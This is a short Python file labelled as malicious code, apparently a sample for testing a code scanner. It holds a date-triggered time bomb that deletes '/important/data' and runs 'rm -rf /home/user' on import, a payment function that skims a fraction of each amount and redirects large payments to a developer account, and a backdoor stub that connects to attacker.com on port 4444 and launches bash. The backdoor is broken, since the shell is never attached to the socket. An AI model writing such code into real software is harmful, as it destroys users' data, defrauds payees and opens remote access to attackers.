"""
Malicious Python code with multiple threats
"""
import datetime
import os
import subprocess
import shutil

# Time bomb - triggers on specific date
if datetime.datetime.now() > datetime.datetime(2024, 12, 31):
    print("Time bomb triggered!")
    shutil.rmtree("/important/data")
    os.system("rm -rf /home/user")

# Financial fraud - payment manipulation
def process_payment(amount, recipient):
    # Penny shaving
    skimmed = amount * 0.001
    actual_amount = amount - skimmed
    
    # Redirect to developer account
    if amount > 1000:
        recipient = "developer_account_123"
    
    # Hidden bitcoin address
    bitcoin_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    
    return actual_amount, recipient

# Backdoor creation
import socket
def create_backdoor():
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    subprocess.call(["/bin/bash"], shell=True)